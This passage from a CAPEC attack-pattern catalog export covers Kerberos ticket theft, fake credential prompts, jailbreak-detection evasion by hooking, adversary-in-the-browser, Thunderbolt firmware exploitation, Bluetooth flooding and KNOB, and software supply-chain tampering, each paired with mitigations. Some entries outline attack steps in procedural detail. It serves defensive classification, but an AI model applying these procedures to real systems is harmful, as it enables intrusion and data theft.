Privileges::SCOPE:Confidentiality:SCOPE:Authorization:TECHNICAL IMPACT:Read Data::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::\",\"::Create a strong password policy and ensure that your system enforces this policy for Kerberos service accounts.::Ensure Kerberos service accounts are not reusing username/password combinations for multiple systems, applications, or services.::Do not reuse Kerberos service account credentials across systems.::Deny remote use of Kerberos service account credentials to log into domain systems.::Do not allow Kerberos service accounts to be a local administrator on more than one system.::Enable at least AES Kerberos encryption for tickets.::Monitor system and domain logs for abnormal credential access.::\",\"::Bronze Butler (also known as Tick), has been shown to leverage forged Kerberos Ticket Granting Tickets (TGTs) and Ticket Granting Service (TGS) tickets to maintain administrative access on a number of systems. [REF-584]::PowerSploit's Invoke-Kerberoast module can be leveraged to request Ticket Granting Service (TGS) tickets and return crackable ticket hashes. [REF-585] [REF-586]::\",\"::522::307::308::309::262::263::654::294::836::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1558:ENTRY NAME:Steal or Forge Kerberos Tickets::\",\"TYPE:Other:NOTE:Kerberos centers around a ticketing system that is used to request/grant access to resources and to then access the requested resources. If one of these tickets is acquired, an adversary could gain access to a specific resource; access any resource a user has privileges to access; gain access to services that use Kerberos as an authentication mechanism and generate tickets to access a particular resource and the system that hosts the resource; or generate Ticket Granting Tickets (TGTs) for any domain account within Active Directory.::\",\n654,\"Credential Prompt Impersonation\",Detailed,Stable,\"An adversary, through a previously installed malicious application, impersonates a credential prompt in an attempt to steal a user's credentials.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:504::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine suitable tasks to exploit] Determine what tasks exist on the target system that may result in a user providing their credentials.:TECHNIQUE:Determine what tasks prompt a user for their credentials.::STEP:2:PHASE:Exploit:DESCRIPTION:[Impersonate Task] Impersonate a legitimate task, either expected or unexpected, in an attempt to gain user credentials.:TECHNIQUE:Prompt a user for their credentials, while making the user believe the credential request is legitimate.::\",\"::The adversary must already have access to the target system via some means.::A legitimate task must exist that an adversary can impersonate to glean credentials.::\",\"::SKILL:Once an adversary has gained access to the target system, impersonating a credential prompt is not difficult.:LEVEL:Low::\",\"::Malware or some other means to initially comprise the target system.::Additional malware to impersonate a legitimate credential prompt.::\",\"::Credential prompts that appear illegitimate or unexpected.::\",\"::SCOPE:Access Control:SCOPE:Authentication:TECHNICAL IMPACT:Gain Privileges::\",\"::The only known mitigation to this attack is to avoid installing the malicious application on the device. However, to impersonate a running task the malicious application does need the GET_TASKS permission to be able to query the task list, and being suspicious of applications with that permission can help.::\",\"::An adversary monitors the system task list for Microsoft Outlook in an attempt to determine when the application may prompt the user to enter their credentials to view encrypted email. Once the task is executed, the adversary impersonates the credential prompt to obtain the user's Microsoft Outlook encryption credentials. These credentials can then be leveraged by the adversary to read a user's encrypted email.::An adversary randomly prompts a user to enter their system credentials, tricking the user into believing that a background process requires the credentials to function. The adversary can then use these gleaned credentials to execute additional attacks or obtain data.::\",\"::1021::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1056:ENTRY NAME:Input Capture::::TAXONOMY NAME:ATTACK:ENTRY ID:1548.004:ENTRY NAME:Abuse Elevation Control Mechanism: Elevated Execution with Prompt::\",\"\",\n655,\"Avoid Security Tool Identification by Adding Data\",Detailed,Draft,\"An adversary adds data to a file to increase the file size beyond what security tools are capable of handling in an attempt to mask their actions. In addition to this, adding data to a file also changes the file's hash, frustrating security tools that look for known bad files by their hash.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:572::\",\"\",\"\",\"\",\"\",\"\",\"::SCOPE:Accountability:TECHNICAL IMPACT:Hide Activities:TECHNICAL IMPACT:Bypass Protection Mechanism::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::\",\"\",\"::Adding data to change the checksum of a file and can be used to avoid hash-based denylists and static anti-virus signatures.::\",\"\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1027.001:ENTRY NAME:Obfuscated Files or Information:Binary padding::\",\"\",\n657,\"Malicious Automated Software Update via Spoofing\",Detailed,Draft,\"An attackers uses identify or content spoofing to trick a client into performing an automated software update from a malicious source. A malicious automated software update that leverages spoofing can include content or identity spoofing as well as protocol spoofing. Content or identity spoofing attacks can trigger updates in software by embedding scripted mechanisms within a malicious web page, which masquerades as a legitimate update source. Scripting mechanisms communicate with software components and trigger updates from locations specified by the attackers' server. The result is the client believing there is a legitimate software update available but instead downloading a malicious update from the attacker.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:186::\",\"\",\"\",\"\",\"\",\"\",\"::SCOPE:Access Control:SCOPE:Availability:SCOPE:Confidentiality:TECHNICAL IMPACT:Execute Unauthorized Commands::\",\"\",\"::An example of the spoofing strategy would be the eTrust Antivirus Webscan Automated Update Remote Code Execution vulnerability (CVE-2006-3976) and (CVE-2006-3977) whereby an ActiveX control could be remotely manipulated by an attacker controlled web page to download and execute the attackers' code without integrity checking.::\",\"::494::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1072:ENTRY NAME:Software Deployment Tools::\",\"\",\n660,\"Root/Jailbreak Detection Evasion via Hooking\",Detailed,Stable,\"An adversary forces a non-restricted mobile application to load arbitrary code or code files, via Hooking, with the goal of evading Root/Jailbreak detection. Mobile device users often Root/Jailbreak their devices in order to gain administrative control over the mobile operating system and/or to install third-party mobile applications that are not provided by authorized application stores (e.g. Google Play Store and Apple App Store). Adversaries may further leverage these capabilities to escalate privileges or bypass access control on legitimate applications. Although many mobile applications check if a mobile device is Rooted/Jailbroken prior to authorized use of the application, adversaries may be able to hook code in order to circumvent these checks. Successfully evading Root/Jailbreak detection allows an adversary to execute administrative commands, obtain confidential data, impersonate legitimate users of the application, and more.\",\"\",Medium,Very High,\"::NATURE:ChildOf:CAPEC ID:251::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify application with attack potential] The adversary searches for and identifies a mobile application that could be exploited for malicious purposes (e.g. banking, voting, or medical applications).:TECHNIQUE:Search application stores for mobile applications worth exploiting::STEP:2:PHASE:Experiment:DESCRIPTION:[Develop code to be hooked into chosen target application] The adversary develops code or leverages existing code that will be hooked into the target application in order to evade Root/Jailbreak detection methods.:TECHNIQUE:Develop code or leverage existing code to bypass Root/Jailbreak detection methods.:TECHNIQUE:Test the code to see if it works.:TECHNIQUE:Iteratively develop the code until Root/Jailbreak detection methods are evaded.::STEP:3:PHASE:Exploit:DESCRIPTION:[Execute code hooking to evade Root/Jailbreak detection methods] Once hooking code has been developed or obtained, execute the code against the target application to evade Root/Jailbreak detection methods.:TECHNIQUE:Hook code into the target application.::\",\"::The targeted application must be non-restricted to allow code hooking.::\",\"::SKILL:Knowledge about Root/Jailbreak detection and evasion techniques.:LEVEL:High::SKILL:Knowledge about code hooking.:LEVEL:Medium::\",\"::The adversary must have a Rooted/Jailbroken mobile device.::The adversary needs to have enough access to the target application to control the included code or file.::\",\"\",\"::SCOPE:Integrity:SCOPE:Authorization:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Through Root/Jailbreak Detection Evasion via Hooking, the adversary compromises the integrity of the application.::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:SCOPE:Access Control:TECHNICAL IMPACT:Read Data:NOTE:An adversary may leverage Root/Jailbreak Detection Evasion via Hooking in order to obtain sensitive information.::\",\"::Ensure mobile applications are signed appropriately to avoid code inclusion via hooking.::Inspect the application's memory for suspicious artifacts, such as shared objects/JARs or dylibs, after other Root/Jailbreak detection methods.::Inspect the application's stack trace for suspicious method calls.::Allow legitimate native methods, and check for non-allowed native methods during Root/Jailbreak detection methods.::For iOS applications, ensure application methods do not originate from outside of Apple's SDK.::\",\"::An adversary targets a non-restricted iOS banking application in an attempt to compromise sensitive user data. The adversary creates Objective-C runtime code that always returns false when checking for the existence of the Cydia application. The malicious code is then dynamically loaded into the application via the DYLD_INSERT_LIBRARIES environment variable. When the banking applications checks for Cydia, the hooked code returns false, so the application assumes the device is stock (i.e. not Jailbroken) and allows it to access the application. However, the adversary has just evaded Jailbreak detection and is now able to glean user credentials and/or transaction details.::An adversary targets a mobile voting application on an Android device with the goal of committing voter fraud. Leveraging the Xposed framework, the adversary is able to create and hook Java code into the application that bypasses Root detection methods. When the voting application attempts to detect a Rooted device by checking for commonly known installed packages associated with Rooting, the hooked code removes the suspicious packages before returning to the application. As a result, the application believes the device is stock (i.e. not Rooted) when in actuality this is not the case. Having evading Root detection, the adversary is now able to cast votes for the candidate of their choosing as a variety of different users.::\",\"::829::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1055:ENTRY NAME:Process Injection::\",\"\",\n662,\"Adversary in the Browser (AiTB)\",Standard,Stable,\"An adversary exploits security vulnerabilities or inherent functionalities of a web browser, in order to manipulate traffic between two endpoints.\",\"::TERM:Man in the Browser:DESCRIPTION:::TERM:Boy in the Browser:DESCRIPTION:::TERM:Man in the Mobile:DESCRIPTION:::\",High,Very High,\"::NATURE:ChildOf:CAPEC ID:94::\",\"::STEP:1:PHASE:Experiment:DESCRIPTION:The adversary tricks the victim into installing the Trojan Horse malware onto their system.:TECHNIQUE:Conduct phishing attacks, drive-by malware installations, or masquerade malicious browser extensions as being legitimate.::STEP:2:PHASE:Experiment:DESCRIPTION:The adversary inserts themself into the communication channel initially acting as a routing proxy between the two targeted components.::STEP:3:PHASE:Exploit:DESCRIPTION:The adversary observes, filters, or alters passed data of their choosing to gain access to sensitive information or to manipulate the actions of the two target components for their own purposes.::\",\"::The adversary must install or convince a user to install a Trojan.::There are two components communicating with each other.::An attacker is able to identify the nature and mechanism of communication between the two target components.::Strong mutual authentication is not used between the two target components yielding opportunity for adversarial interposition.::For browser pivoting, the SeDebugPrivilege and a high-integrity process must both exist to execute this attack.::\",\"::SKILL:Tricking the victim into installing the Trojan is often the most difficult aspect of this attack. Afterwards, the remainder of this attack is fairly trivial.:LEVEL:Medium::\",\"\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::\",\"::Ensure software and applications are only downloaded from legitimate and reputable sources, in addition to conducting integrity checks on the downloaded component.::Leverage anti-malware tools, which can detect Trojan Horse malware.::Use strong, out-of-band mutual authentication to always fully authenticate both ends of any communications channel.::Limit user permissions to prevent browser pivoting.::Ensure browser sessions are regularly terminated and when their effective lifetime ends.::\",\"::An adversary conducts a phishing attack and tricks a victim into installing a malicious browser plugin. The adversary then positions themself between the victim and their banking institution. The victim begins by initiating a funds transfer from their personal savings to their personal checking account. Using injected JavaScript, the adversary captures this request and modifies it to transfer an increased amount of funds to an account that they controls, before sending it to the bank. The bank processes the transfer and sends the confirmation notice back to the victim, which is instead intercepted by the adversary. The adversary modifies the confirmation to reflect the original transaction details and sends this modified message back to the victim. Upon receiving the confirmation, the victim assumes the transfer was successful and is unaware that their money has just been transferred to the adversary.::In 2020, the Agent Tesla malware was leveraged to conduct AiTB attacks against organizations within the gas, oil, and other energy sectors. The malware was delivered via a spearphishing campaign and has the capability to form-grab, keylog, copy clipboard data, extract credentials, and capture screenshots. [REF-630]::Boy in the browser attacks are a subset of AiTB attacks. Similar to AiTB attacks, the adversary must first trick the victim into installing a Trojan, either via social engineering or drive-by-download attacks. The malware then modifies the victim's hosts file in order to reroute web traffic from an intended website to an adversary-controlled website that mimics the legitimate website. The adversary is now able to observe, intercept, and/or modify all traffic, as in a traditional Adversary in the Middle attack (CAPEC-94). BiTB attacks are low-cost, easy to execute, and more difficult to detect since the malware often removes itself once the attack has concluded. [REF-631]::Man in the Mobile attacks are a subset of AiTB attacks that target mobile device users. Like AiTB attacks, an adversary convinces a victim to install a Trojan mobile application on their mobile device, often under the guise of security. Once the victim has installed the application, the adversary can capture all SMS traffic to bypass SMS-based out-of-band authentication systems. [REF-632]::\",\"::300::494::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1185:ENTRY NAME:Man in the Browser::::TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Man-in-the-browser attack::\",\"\",\n665,\"Exploitation of Thunderbolt Protection Flaws\",Detailed,Stable,\"An adversary leverages a firmware weakness within the Thunderbolt protocol, on a computing device to manipulate Thunderbolt controller firmware in order to exploit vulnerabilities in the implementation of authorization and verification schemes within Thunderbolt protection mechanisms. Upon gaining physical access to a target device, the adversary conducts high-level firmware manipulation of the victim Thunderbolt controller SPI (Serial Peripheral Interface) flash, through the use of a SPI Programing device and an external Thunderbolt device, typically as the target device is booting up. If successful, this allows the adversary to modify memory, subvert authentication mechanisms, spoof identities and content, and extract data and memory from the target device. Currently 7 major vulnerabilities exist within Thunderbolt protocol with 9 attack vectors as noted in the Execution Flow.\",\"\",Low,Very High,\"::NATURE:ChildOf:CAPEC ID:276::NATURE:CanFollow:CAPEC ID:390::NATURE:PeerOf:CAPEC ID:458::NATURE:PeerOf:CAPEC ID:148::NATURE:PeerOf:CAPEC ID:151::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey physical victim environment and potential Thunderbolt system targets] The adversary monitors the target's physical environment to identify systems with Thunderbolt interfaces, identify potential weaknesses in physical security in addition to periods of nonattendance by the victim over their Thunderbolt interface equipped devices, and when the devices are in locked or sleep state.::STEP:2:PHASE:Explore:DESCRIPTION:[Evaluate the target system and its Thunderbolt interface] The adversary determines the device's operating system, Thunderbolt interface version, and any implemented Thunderbolt protections to plan the attack.::STEP:1:PHASE:Experiment:DESCRIPTION:[Obtain and/or clone firmware image] The adversary physically manipulates Thunderbolt enabled devices to acquire the firmware image from the target and/or adversary Thunderbolt host controller's SPI (Serial Peripheral Interface) flash.:TECHNIQUE:Disassemble victim and/or adversary device enclosure with basic tools to gain access to Thunderbolt controller SPI flash by connecting adversary SPI programmer.:TECHNIQUE:Adversary connects SPI programmer to adversary-controlled Thunderbolt enabled device to obtain/clone victim thunderbolt controller firmware image through tools/scripts.:TECHNIQUE:Clone firmware image with SPI programmer and tools/scripts on adversary-controlled device.::STEP:2:PHASE:Experiment:DESCRIPTION:[Parse and locate relevant firmware data structures and information based upon Thunderbolt controller model, firmware version, and other information] The acquired victim and/or adversary firmware image is parsed for specific data and other relevant identifiers required for exploitation, based upon the victim device information and firmware version.:TECHNIQUE:Utilize pre-crafted tools/scripts to parse and locate desired firmware data and modify it.:TECHNIQUE:Locate DROM (Device Read Only Memory) data structure section and calculate/determine appropriate offset to replicate victim device UUID.:TECHNIQUE:Locate ACL (Access Control List) data structure and calculate/determine appropriate offsets to identify victim device UUID.:TECHNIQUE:Locate data structure containing challenge-response key information between appropriate offsets.::STEP:3:PHASE:Experiment:DESCRIPTION:[Disable Thunderbolt security and prevent future Thunderbolt security modifications (if necessary)] The adversary overrides the target device's Thunderbolt Security Level to None (SL0) and/or enables block protections upon the SPI flash to prevent the ability for the victim to perform and/or recognize future Thunderbolt security modifications as well as update the Thunderbolt firmware.:TECHNIQUE:The adversary-controlled Thunderbolt device, connected to SPI programmer and victim device via Thunderbolt ports, is utilized to execute commands within tools/scripts to disable SPI flash protections, modify Thunderbolt Security Level, and enable malicious SPI flash protections.::STEP:4:PHASE:Experiment:DESCRIPTION:[Modify/replace victim Thunderbolt firmware image] The modified victim and/or adversary thunderbolt firmware image is written to attacker SPI flash.::STEP:1:PHASE:Exploit:DESCRIPTION:[Connect adversary-controlled thunderbolt enabled device to victim device and verify successful execution of malicious actions] The adversary needs to determine if their exploitation of selected vulnerabilities had the intended effects upon victim device.:TECHNIQUE:Observe victim device identify adversary device as the victim device and enables PCIe tunneling.:TECHNIQUE:Resume victim device from sleep, connect adversary-controlled device and observe security is disabled and Thunderbolt connectivity is restored with PCIe tunneling being enabled.:TECHNIQUE:Observe that in UEFI or Thunderbolt Management Tool/UI that the Security Level does not match adversary modified Security Level of None (SL0):TECHNIQUE:Observe after installation of Firmware update that within Thunderbolt Management UI the NVM version is unchanged/same prior to the prompt of successful Firmware update/installation.::STEP:2:PHASE:Exploit:DESCRIPTION:[Exfiltration of desired data from victim device to adversary device] Utilize PCIe tunneling to transfer desired data and information from victim device across Thunderbolt connection.::\",\"::The adversary needs at least a few minutes of physical access to a system with an open Thunderbolt port, version 3 or lower, and an external thunderbolt device controlled by the adversary with maliciously crafted software and firmware, via an SPI Programming device, to exploit weaknesses in security protections.::\",\"::SKILL:Detailed knowledge on various system motherboards, PCI Express Domain, SPI, and Thunderbolt Protocol in order to interface with internal system components via external devices.:LEVEL:High::SKILL:Detailed knowledge on OS/Kernel memory address space, Direct Memory Access (DMA) mapping, Input-Output Memory Management Units (IOMMUs), and vendor memory protections for data leakage.:LEVEL:High::SKILL:Detailed knowledge on scripting and SPI programming in order to configure and modify Thunderbolt controller firmware and software configurations.:LEVEL:High::\",\"::SPI Programming device capable of modifying/configuring or replacing the firmware of Thunderbolt device stored on SPI Flash of target Thunderbolt controller, as well as modification/spoofing of adversary-controlled Thunderbolt controller.::Precrafted scripts/tools capable of implementing the modification and replacement of Thunderbolt Firmware.::Thunderbolt-enabled computing device capable of interfacing with target Thunderbolt device and extracting/dumping data and memory contents of target device.::\",\"::Windows Event logs may document the access of Thunderbolt port as a USB 3.0 event as well as any malicious actions taken upon target device as file system and memory events.::\",\"::SCOPE:Access Control:TECHNICAL IMPACT:Bypass Protection Mechanism::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Authorization:TECHNICAL IMPACT:Execute Unauthorized Commands::\",\"::Implementation: Kernel Direct Memory Access Protection::Configuration: Enable UEFI option USB Passthrough mode - Thunderbolt 3 system port operates as USB 3.1 Type C interface::Configuration: Enable UEFI option DisplayPort mode - Thunderbolt 3 system port operates as video-only DP interface::Configuration: Enable UEFI option Mixed USB/DisplayPort mode - Thunderbolt 3 system port operates as USB 3.1 Type C interface with support for DP mode::Configuration: Set Security Level to SL3 for Thunderbolt 2 system port::Configuration: Disable PCIe tunneling to set Security Level to SL3::Configuration: Disable Boot Camp upon MacOS systems::\",\"::An adversary steals a password protected laptop that contains a Thunderbolt 3 enabled port, from a work environment. The adversary uses a screw driver to remove the back panel of the laptop and connects a SPI Programming device to the Thunderbolt Host Controller SPI Flash of the stolen victim device to interface with it on the adversary's own Thunderbolt enabled device via Thunderbolt cables. The SPI Programming device is utilized to execute scripts/tools from the adversary's own system to copy, parse, and modify the victim's Thunderbolt firmware stored on SPI Flash. The device UUID value is obtained, by computing the appropriate offset based upon Thunderbolt firmware version and the OS of victim device, from the DROM section of victim Thunderbolt host controller firmware image. The firmware image is written to adversary Thunderbolt host controller SPI flash to clone and spoof victim device identity. The adversary reboots the victim device, with the victim device identifying the Thunderbolt connection of the adversary's Thunderbolt device as itself and enables PCIe tunneling. The adversary finally transfers the hard drive and memory contents of victim device across Thunderbolt connection.::\",\"::345::353::288::1188::862::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1211:ENTRY NAME:Exploitation for Defensive Evasion::::TAXONOMY NAME:ATTACK:ENTRY ID:1542.002:ENTRY NAME:Pre-OS Boot: Component Firmware::::TAXONOMY NAME:ATTACK:ENTRY ID:1556:ENTRY NAME:Modify Authentication Process::\",\"\",\n666,\"BlueSmacking\",Standard,Draft,\"An adversary uses Bluetooth flooding to transfer large packets to Bluetooth enabled devices over the L2CAP protocol with the goal of creating a DoS. This attack must be carried out within close proximity to a Bluetooth enabled device.\",\"\",Medium,Medium,\"::NATURE:ChildOf:CAPEC ID:125::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Scan for Bluetooth Enabled Devices] Using BlueZ along with an antenna, an adversary searches for devices with Bluetooth on.:TECHNIQUE:Note the MAC address of the device you want to attack.::STEP:2:PHASE:Experiment:DESCRIPTION:[Change L2CAP Packet Length] The adversary must change the L2CAP packet length to create packets that will overwhelm a Bluetooth enabled device.:TECHNIQUE:An adversary downloads and installs BlueZ, the standard Bluetooth utility package for Linux.::STEP:3:PHASE:Exploit:DESCRIPTION:[Flood] An adversary sends the packets to the target device, and floods it until performance is degraded.::\",\"::The system/application has Bluetooth enabled.::\",\"::SKILL:An adversary only needs a Linux machine along with a Bluetooth adapter, which is extremely common.:LEVEL:Low::\",\"\",\"::Performance is degraded or halted by incoming L2CAP packets.::\",\"::SCOPE:Availability:TECHNICAL IMPACT:Unreliable Execution:TECHNICAL IMPACT:Resource Consumption::\",\"::Disable Bluetooth when not being used.::When using Bluetooth, set it to hidden or non-discoverable mode.::\",\"\",\"::404::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1498.001:ENTRY NAME:Network Denial of Service: Direct Network Flood::::TAXONOMY NAME:ATTACK:ENTRY ID:1499.001:ENTRY NAME:Endpoint Denial of Service: OS Exhaustion Flood::\",\"\",\n668,\"Key Negotiation of Bluetooth Attack (KNOB)\",Standard,Draft,\"An adversary can exploit a flaw in Bluetooth key negotiation allowing them to decrypt information sent between two devices communicating via Bluetooth. The adversary uses an Adversary in the Middle setup to modify packets sent between the two devices during the authentication process, specifically the entropy bits. Knowledge of the number of entropy bits will allow the attacker to easily decrypt information passing over the line of communication.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:115::NATURE:CanPrecede:CAPEC ID:148::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Discovery] Using an established Person in the Middle setup, search for Bluetooth devices beginning the authentication process.:TECHNIQUE:Use packet capture tools.::STEP:2:PHASE:Experiment:DESCRIPTION:[Change the entropy bits] Upon recieving the initial key negotiation packet from the master, the adversary modifies the entropy bits requested to 1 to allow for easy decryption before it is forwarded.::STEP:3:PHASE:Exploit:DESCRIPTION:[Capture and decrypt data] Once the entropy of encryption is known, the adversary can capture data and then decrypt on their device.::\",\"::Person in the Middle network setup.::\",\"::SKILL:Ability to modify packets.:LEVEL:Medium::\",\"::Bluetooth adapter, packet capturing capabilities.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::\",\"::Newer Bluetooth firmwares ensure that the KNOB is not negotaited in plaintext. Update your device.::\",\"::Given users Alice, Bob and Charlie (Charlie being the attacker), Alice and Bob begin to agree on an encryption key when connecting. While Alice sends a message to Bob that an encryption key with 16 bytes of entropy should be used, Charlie changes this to 1 and forwards the request to Bob and continues forwarding these packets until authentication is successful.::\",\"::425::285::693::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1565.002:ENTRY NAME:Data Manipulation: Transmitted Data Manipulation::\",\"\",\n669,\"Alteration of a Software Update\",Standard,Draft,\"An adversary with access to an organization’s software update infrastructure inserts malware into the content of an outgoing update to fielded systems where a wide range of malicious effects are possible. With the same level of access, the adversary can alter a software update to perform specific malicious acts including granting the adversary control over the software’s normal functionality.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:184::NATURE:CanPrecede:CAPEC ID:673::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify software with frequent updates] The adversary must first identify a target software that has updates at least with some frequency, enough that there is am update infrastructure.::STEP:2:PHASE:Experiment:DESCRIPTION:[Gain access to udpate infrastructure] The adversary must then gain access to the organization's software update infrastructure. This can either be done by gaining remote access from outside the organization, or by having a malicious actor inside the organization gain access. It is often easier if someone within the organization gains access.::STEP:3:PHASE:Exploit:DESCRIPTION:[Alter the software update] Through access to the software update infrastructure, an adversary will alter the software update by injecting malware into the content of an outgoing update.::\",\"::An adversary would need to have penetrated an organization’s software update infrastructure including gaining access to components supporting the configuration management of software versions and updates related to the software maintenance of customer systems.::\",\"::SKILL:Skills required include the ability to infiltrate the organization’s software update infrastructure either from the Internet or from within the organization, including subcontractors, and be able to change software being delivered to customer/user systems in an undetected manner.:LEVEL:High::\",\"\",\"\",\"::SCOPE:Access Control:TECHNICAL IMPACT:Gain Privileges::SCOPE:Authorization:TECHNICAL IMPACT:Execute Unauthorized Commands::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::\",\"::Have a Software Assurance Plan that includes maintaining strict configuration management control of source code, object code and software development, build and distribution tools; manual code reviews and static code analysis for developmental software; and tracking of all storage and movement of code.::Require elevated privileges for distribution of software and software updates.::\",\"::A subcontractor to a software developer injects maliciously altered software updates into an automated update process that distributes to government and commercial customers software containing a hidden backdoor.::\",\"\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1195.002:ENTRY NAME:Supply Chain Compromise: Compromise Software Supply Chain::\",\"\",\n670,\"Software Development Tools Maliciously Altered\",Detailed,Draft,\"An adversary with the ability to alter tools used in a development environment causes software to be developed with maliciously modified tools. Such tools include requirements management and database tools, software design tools, configuration management tools, compilers, system build tools, and software performance testing and load testing tools. The adversary then carries out malicious acts once the software is deployed including malware infection of other systems to support further compromises.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:444::NATURE:CanPrecede:CAPEC ID:669::\",\"\",\"::An adversary would need to have access to a targeted developer’s development environment and in particular to tools used to design, create, test and manage software, where the adversary could ensure malicious code is included in software packages built through alteration or substitution of tools in the environment used in the development of software.::\",\"::SKILL:Ability to leverage common delivery mechanisms (e.g., email attachments, removable media) to infiltrate a development environment to gain access to software development tools for the purpose of malware insertion into an existing tool or replacement of an existing tool with a maliciously altered copy.:LEVEL:High::\",\"\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Execute Unauthorized Commands::SCOPE:Access Control:TECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:TECHNICAL IMPACT:Modify Data:TECHNICAL IMPACT:Read Data::\",\"::Have a security concept of operations (CONOPS) for the development environment that includes: Maintaining strict security administration and configuration management of requirements management and database tools, software design tools, configuration management tools, compilers, system build tools, and software performance testing and load testing tools.::Avoid giving elevated privileges to developers.::\",\"::An adversary with access to software build tools inside an Integrated Development Environment IDE alters a script used for downloading dependencies from a dependent code repository where the script has been changed to include malicious code implanted in the repository by the adversary.::\",\"\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1127:ENTRY NAME:Trusted Developer Utilities Proxy Execution::::TAXONOMY NAME:ATTACK:ENTRY ID:1195.001:ENTRY NAME:Supply Chain Compromise: Compromise Software Dependencies and Development Tools::\",\"\",\n671,\"Requirements for ASIC Functionality Maliciously Altered\",Detailed,Draft,\"An adversary with access to functional requirements for an application specific integrated circuit (ASIC), a chip designed/customized for a singular particular use, maliciously alters requirements derived from originating capability needs. In the chip manufacturing process, requirements drive the chip design which, when the chip is fully manufactured, could result in an ASIC which may not meet the user’s needs, contain malicious functionality, or exhibit other anomalous behaviors thereby affecting the intended use of the ASIC.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:447::\",\"\",\"::An adversary would need to have access to a foundry’s or chip maker’s requirements management system that stores customer requirements for ASICs, requirements upon which the design of the ASIC is based.::\",\"::SKILL:An adversary would need experience in designing chips based on functional requirements in order to manipulate requirements in such a way that deviations would not be detected in subsequent stages of ASIC manufacture and where intended malicious functionality would be available to the adversary once integrated into a system and fielded.:LEVEL:High::\",\"\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Alter Execution Logic::\",\"::Utilize DMEA’s (Defense Microelectronics Activity) Trusted Foundry Program members for acquisition of microelectronic components.::Ensure that each supplier performing hardware development implements comprehensive, security-focused configuration management including for hardware requirements and design.::Require that provenance of COTS microelectronic components be known whenever procured.::Conduct detailed vendor assessment before acquiring COTS hardware.::\",\"::An adversary with access to ASIC functionality requirements for various customers, targets a particular customer’s ordered lot of ASICs by altering its functional requirements such that the ASIC design will result in a manufactured chip that does not meet the customer’s capability needs.::\",\"\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1195.003:ENTRY NAME:Supply Chain Compromise: Compromise Hardware Supply Chain::\",\"\",\n672,\"Malicious Code Implanted During Chip Programming\",Detailed,Draft,\"During the programming step of chip manufacture, an adversary with access and necessary technical skills maliciously alters a chip’s intended program logic to produce an effect intended by the adversary when the fully manufactured chip is deployed and in operational use. Intended effects can include the ability of the adversary to remotely control a host system to carry out malicious acts.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:444::\",\"\",\"::An adversary would need to have access to a foundry’s or chip maker’s development/production environment where programs for specific chips are developed, managed and uploaded into targeted chips prior to distribution or sale.::\",\"::SKILL:An adversary needs to be skilled in microprogramming, manipulation of configuration management systems, and in the operation of tools used for the uploading of programs into chips during manufacture. Uploading can be for individual chips or performed on a large scale basis.:LEVEL:Medium::\",\"\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Alter Execution Logic::\",\"::Utilize DMEA’s (Defense Microelectronics Activity) Trusted Foundry Program members for acquisition of microelectronic components.::Ensure that each supplier performing hardware development implements comprehensive, security-focused configuration management of microcode and microcode generating tools and software.::Require that provenance of COTS microelectronic components be known whenever procured.::Conduct detailed vendor assessment before acquiring COTS hardware.::\",\"::Following a chip’s production process steps of test and verification and validation of chip circuitry, an adversary involved in the generation of microcode defining the chip’s function(s) inserts a malicious instruction that will become part of the chip’s program. When integrated into a system, the chip will produce an effect intended by the adversary.::\",\"\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1195.003:ENTRY NAME:Supply Chain Compromise: Compromise Hardware Supply Chain::\",\"\",\n673,\"Developer Signing Maliciously Altered Software\",Detailed,Draft,\"Software produced by a reputable developer is clandestinely infected with malicious code and then digitally signed by the unsuspecting developer, where the software has been altered via a compromised software development or build process prior to being signed. The receiver or user of the software has no reason to believe that it is anything but legitimate and proceeds to deploy it to organizational systems. This attack differs from CAPEC-206, since the developer is inadvertently signing malicious code they believe to be legitimate and which they are 